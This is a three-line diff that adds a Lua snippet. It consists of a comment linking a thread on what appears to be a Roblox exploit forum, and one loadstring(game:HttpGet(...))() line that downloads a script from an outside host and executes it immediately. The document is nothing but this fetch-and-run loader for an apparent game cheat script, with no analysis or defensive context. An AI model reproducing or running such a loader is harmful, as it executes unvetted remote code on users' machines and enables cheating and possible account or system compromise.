@@ -1,0 +1,3 @@
+-- https://v3rmillion.net/showthread.php?tid=944914
+
+loadstring(game:HttpGet(('https://aizen.ml/uploads/efs.lua')))()
